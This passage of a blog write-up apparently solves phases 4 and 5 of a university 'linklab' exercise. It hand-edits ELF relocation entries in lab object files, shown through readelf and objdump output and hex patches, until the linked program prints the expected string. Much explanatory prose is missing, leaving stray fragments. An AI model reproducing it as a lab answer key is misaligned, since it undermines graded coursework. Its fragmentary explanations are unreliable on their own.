<span class="number">26</span>:</span><br><span class="line">                tmp=xxx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        answer[i]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    answer[<span class="number">10</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>swith.rodata.rel.rodataoffset.rel.rodataSym. Name.text <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a> </p><p>cookie530x53-0x41&#x3D;0x12</p><p><code>  6d:   8b 04 85 04 00 00 00    mov    0x4(,%eax,4),%eax;</code>.rodata0x12*4+4&#x3D;0x4c</p><p><img src="/2023/05/08/ics4-linklab/image-20230507173942701.png" alt="image-20230507173942701"></p><p>jmp *%eax0be<code> be:   c6 45 f7 42             movb   $0x42,-0x9(%ebp)</code></p><p><img src="/2023/05/08/ics4-linklab/image-20230507174043686.png" alt="image-20230507174043686"></p><p>Bcookieebp-9</p><p>6</p><p><img src="/2023/05/08/ics4-linklab/image-20230507174600892.png" alt="image-20230507174600892"></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase4.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line"><span class="number">666666666</span></span><br></pre></td></tr></table></figure><h2 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase5.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">fish: Job <span class="number">1</span>, <span class="string">&#x27;./linkbomb&#x27;</span> terminated by signal <span class="title function_">SIGILL</span> <span class="params">(Illegal instruction)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x7f8</span> contains <span class="number">23</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000066</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000075</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000086</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000b</span>d  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000f</span>9  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000107</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000138</span>  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000162</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000001</span>c0  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001e4</span>  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>ea  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000246</span>  <span class="number">00001002</span> R_386_PC32        <span class="number">000000</span>ef   generate_code</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000256</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000268</span>  <span class="number">00001702</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>7</p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase5.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 25 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS phase5.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    5 .bss</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6 .rodata</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    9 .note.GNU-stack</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT   10 .eh_frame</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    8 .comment</span><br><span class="line">     9: 00000000   250 OBJECT  GLOBAL DEFAULT    3 ohMkhV</span><br><span class="line">    10: 00000000    93 FUNC    GLOBAL DEFAULT    1 OOtZxJJdNH</span><br><span class="line">    11: 000000fc     4 OBJECT  GLOBAL DEFAULT    3 phase_id</span><br><span class="line">    12: 00000100    10 OBJECT  GLOBAL DEFAULT    3 tqdzfNje</span><br><span class="line">    13: 00000020    52 OBJECT  GLOBAL DEFAULT    6 yAnKQn</span><br><span class="line">    14: 0000010c     4 OBJECT  GLOBAL DEFAULT    3 aQSEth</span><br><span class="line">    15: 0000005d   146 FUNC    GLOBAL DEFAULT    1 transform_code</span><br><span class="line">    16: 000000ef    60 FUNC    GLOBAL DEFAULT    1 generate_code</span><br><span class="line">    17: 00000080   128 OBJECT  GLOBAL DEFAULT    6 AycPNh</span><br><span class="line">    18: 0000012b   136 FUNC    GLOBAL DEFAULT    1 encode_1</span><br><span class="line">    19: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND strlen</span><br><span class="line">    20: 000001b3   135 FUNC    GLOBAL DEFAULT    1 encode_2</span><br><span class="line">    21: 00000110     8 OBJECT  GLOBAL DEFAULT    3 encoder</span><br><span class="line">    22: 0000023a    56 FUNC    GLOBAL DEFAULT    1 do_phase</span><br><span class="line">    23: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND puts</span><br><span class="line">    24: 00000118     4 OBJECT  GLOBAL DEFAULT    3 phase</span><br></pre></td></tr></table></figure><p>gdb</p><p><img src="/2023/05/08/ics4-linklab/image-20230507200104767.png" alt="image-20230507200104767"></p><h4 id="generate-code"><a href="#generate-code" class="headerlink" title="generate_code"></a>generate_code</h4><p>generate_code</p><p><img src="/2023/05/08/ics4-linklab/image-20230507200258182.png" alt="image-20230507200258182"></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">generate_code</span><span class="params">( <span class="type">int</span> cookie )</span> &#123;</span><br><span class="line">... = cookie;</span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;...; i++ ) &#123;</span><br><span class="line">... = transform_code( ..., i );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transform_code</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000</span>ef &lt;generate_code&gt;:</span><br><span class="line">  ef:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  f0:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  f2:    <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%esp</span><br><span class="line">  f5:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  f8:    a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    %eax,<span class="number">0x0</span></span><br><span class="line">  fd:    c7 <span class="number">45</span> fc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl   $<span class="number">0x0</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">104</span>:    eb <span class="number">1</span>a                jmp    <span class="number">120</span> &lt;generate_code+<span class="number">0x31</span>&gt;</span><br><span class="line"> <span class="number">106</span>:    a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">10b</span>:    ff <span class="number">75</span> fc             push   <span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">10</span>e:    <span class="number">50</span>                   push   %eax</span><br><span class="line"> <span class="number">10f</span>:    e8 fc ff ff ff       call   <span class="number">110</span> &lt;generate_code+<span class="number">0x21</span>&gt;</span><br><span class="line"> <span class="number">114</span>:    <span class="number">83</span> c4 <span class="number">08</span>             add    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">117</span>:    a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    %eax,<span class="number">0x0</span></span><br><span class="line"> <span class="number">11</span>c:    <span class="number">83</span> <span class="number">45</span> fc <span class="number">01</span>          addl   $<span class="number">0x1</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">120</span>:    <span class="number">8b</span> <span class="number">45</span> fc             mov    <span class="number">-0x4</span>(%ebp),%eax</span><br><span class="line"> <span class="number">123</span>:    <span class="number">83</span> f8 <span class="number">0</span>c             cmp    $<span class="number">0xc</span>,%eax</span><br><span class="line"> <span class="number">126</span>:    <span class="number">76</span> de                jbe    <span class="number">106</span> &lt;generate_code+<span class="number">0x17</span>&gt;</span><br><span class="line"> <span class="number">128</span>:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">129</span>:    c9                   leave  </span><br><span class="line"> <span class="number">12</span>a:    c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">10f</span>:    e8 fc ff ff ff       call   <span class="number">110</span> &lt;generate_code+<span class="number">0x21</span>&gt;</span><br></pre></td></tr></table></figure><p>   <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong></p><p>r_info 824</p><p>r_offset110 02  15f</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">0f</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507202240463.png" alt="image-20230507202240463"></p><p>ok</p><p><img src="/2023/05/08/ics4-linklab/image-20230507202423749.png" alt="image-20230507202423749"></p><h4 id="transform-code"><a href="#transform-code" class="headerlink" title="transform_code"></a>transform_code</h4><p>transform_code</p><p><img src="/2023/05/08/ics4-linklab/image-20230507202626683.png" alt="image-20230507202626683"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507202705410.png" alt="image-20230507202705410"></p><p>8b 04 85switch</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">transform_code</span><span class="params">( <span class="type">int</span> code, <span class="type">int</span> mode )</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> ( yAnKQn[mode] ... )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: ......</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: ......</span><br><span class="line">......</span><br><span class="line"><span class="keyword">default</span>: ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000005</span>d &lt;transform_code&gt;:</span><br><span class="line">  <span class="number">5</span>d:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">5</span>e:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">60</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">63</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">6</span>a:    <span class="number">83</span> e0 <span class="number">07</span>             and    $<span class="number">0x7</span>,%eax</span><br><span class="line">  <span class="number">6</span>d:    <span class="number">83</span> f8 <span class="number">07</span>             cmp    $<span class="number">0x7</span>,%eax</span><br><span class="line">  <span class="number">70</span>:    <span class="number">77</span> <span class="number">74</span>                ja     e6 &lt;transform_code+<span class="number">0x89</span>&gt;</span><br><span class="line">  <span class="number">72</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">54</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x54</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">79</span>:    ff e0                jmp    *%eax</span><br><span class="line">  <span class="number">7b</span>:    f7 <span class="number">55</span> <span class="number">08</span>             notl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">7</span>e:    eb <span class="number">6</span>a                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  <span class="number">80</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">83</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">8</span>a:    <span class="number">83</span> e0 <span class="number">03</span>             and    $<span class="number">0x3</span>,%eax</span><br><span class="line">  <span class="number">8</span>d:    <span class="number">89</span> c1                mov    %eax,%ecx</span><br><span class="line">  <span class="number">8f</span>:    d3 <span class="number">7</span>d <span class="number">08</span>             sarl   %cl,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">92</span>:    eb <span class="number">56</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  <span class="number">94</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">97</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">9</span>e:    f7 d0                not    %eax</span><br><span class="line">  a0:    <span class="number">21</span> <span class="number">45</span> <span class="number">08</span>             and    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  a3:    eb <span class="number">45</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  a5:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  a8:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  af:    c1 e0 <span class="number">08</span>             shl    $<span class="number">0x8</span>,%eax</span><br><span class="line">  b2:    <span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             or     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  b5:    eb <span class="number">33</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  b7:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  ba:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  c1:    <span class="number">31</span> <span class="number">45</span> <span class="number">08</span>             xor    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  c4:    eb <span class="number">24</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  c6:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  c9:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  d0:    f7 d0                not    %eax</span><br><span class="line">  d2:    <span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             or     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  d5:    eb <span class="number">13</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  d7:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  da:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  e1:    <span class="number">01</span> <span class="number">45</span> <span class="number">08</span>             add    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  e4:    eb <span class="number">04</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  e6:    f7 <span class="number">5</span>d <span class="number">08</span>             negl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  e9:    <span class="number">90</span>                   nop</span><br><span class="line">  ea:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  ed:    <span class="number">5</span>d                   pop    %ebp</span><br><span class="line">  ee:    c3                   ret    </span><br></pre></td></tr></table></figure><p>5d+58()&#x3D;0x97</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">97</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><p>.rodatayAnKQn</p><p>r_offset 97+3&#x3D;9a  01 yAnKQn13d</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">9</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507205421832.png" alt="image-20230507205421832"></p><p></p><p><img src="/2023/05/08/ics4-linklab/image-20230507205323580.png" alt="image-20230507205323580"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507205344052.png" alt="image-20230507205344052"></p><p></p><p>0x5d+75()&#x3D;0xA8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a8:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><p>offset &#x3D;a8+3&#x3D;AB </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AB <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507205815532.png" alt="image-20230507205815532"></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">da:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DD <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507210127236.png" alt="image-20230507210127236"></p><h4 id="do-phase"><a href="#do-phase" class="headerlink" title="do_phase"></a>do_phase</h4><p><img src="/2023/05/08/ics4-linklab/image-20230507210234694.png" alt="image-20230507210234694"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507210250054.png" alt="image-20230507210250054"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_phase</span><span class="params">()</span> &#123;</span><br><span class="line">generate_code(...);</span><br><span class="line">......; <span class="comment">// Call one encoder here</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000023</span>a &lt;do_phase&gt;:</span><br><span class="line"> <span class="number">23</span>a:    <span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">23b</span>:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">23</span>d:    <span class="number">83</span> ec <span class="number">08</span>             sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">240</span>:    <span class="number">68</span> f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0xf3</span></span><br><span class="line"> <span class="number">245</span>:    e8 fc ff ff ff       call   <span class="number">246</span> &lt;do_phase+<span class="number">0xc</span>&gt;<span class="comment">//call generate_code</span></span><br><span class="line"> <span class="number">24</span>a:    <span class="number">83</span> c4 <span class="number">04</span>             add    $<span class="number">0x4</span>,%esp</span><br><span class="line"> <span class="number">24</span>d:    a1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x4</span>,%eax</span><br><span class="line"> <span class="number">252</span>:    <span class="number">83</span> ec <span class="number">0</span>c             sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">255</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">25</span>a:    ff d0                call   *%eax</span><br><span class="line"> <span class="number">25</span>c:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">25f</span>:    <span class="number">83</span> ec <span class="number">0</span>c             sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">262</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">267</span>:    e8 fc ff ff ff       call   <span class="number">268</span> &lt;do_phase+<span class="number">0x2e</span>&gt;<span class="comment">//printfputs</span></span><br><span class="line"> <span class="number">26</span>c:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">26f</span>:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">270</span>:    c9                   leave  </span><br><span class="line"> <span class="number">271</span>:    c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">24</span>d:    a1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x4</span>,%eax</span><br></pre></td></tr></table></figure><p>call   *%eaxencoder</p><p>offset 24d+1&#x3D;24e,4 01 encoder210x15</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>E <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p></p><p><img src="/2023/05/08/ics4-linklab/image-20230507212648240.png" alt="image-20230507212648240"></p><p>push0puts</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">262</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>push</p><p>encodertqdzfNje</p><p><img src="/2023/05/08/ics4-linklab/image-20230507213134515.png" alt="image-20230507213134515"></p><p>encode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">63</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507214005609.png" alt="image-20230507214005609"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">UuUHH[[!?</span><br></pre></td></tr></table></figure><p>tmd</p><p><img src="/2023/05/08/ics4-linklab/image-20230507220450148.png" alt="image-20230507220450148"></p><p>encoderencode_2</p><p><img src="/2023/05/08/ics4-linklab/image-20230507220550289.png" alt="image-20230507220550289"></p><p>size8</p><p>encode_1,<code>call   *%eax</code>calleax encode_1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Relocation section <span class="string">&#x27;.rel.data&#x27;</span> at offset <span class="number">0x8b0</span> contains <span class="number">4</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">000000f</span>c  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000110</span>  <span class="number">00001201</span> R_386_32          <span class="number">0000012b</span>   encode_1</span><br><span class="line"><span class="number">00000114</span>  <span class="number">00001401</span> R_386_32          <span class="number">000001b</span>3   encode_2</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00001601</span> R_386_32          <span class="number">0000023</span>a   do_phase</span><br></pre></td></tr></table></figure><p>encode_2encode_1encode_2encode_1</p><p><img src="/2023/05/08/ics4-linklab/image-20230507222739182.png" alt="image-20230507222739182"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507222657681.png" alt="image-20230507222657681"></p><p></p><h4 id="encode-1"><a href="#encode-1" class="headerlink" title="encode_1"></a>encode_1</h4><p>encode_1</p><p><img src="/2023/05/08/ics4-linklab/image-20230507223022320.png" alt="image-20230507223022320"></p><p></p><p>encode_2</p><p><img src="/2023/05/08/ics4-linklab/image-20230507223526485.png" alt="image-20230507223526485"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507223541678.png" alt="image-20230507223541678"></p><p>AycPNh,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">159</span>:    <span class="number">0f</span> b6 <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movzbl <span class="number">0x0</span>(%eax),%eax</span><br></pre></td></tr></table></figure><p>0x159+3&#x3D;15C  17&#x3D;0x11</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">11</span> <span class="number">00</span> <span 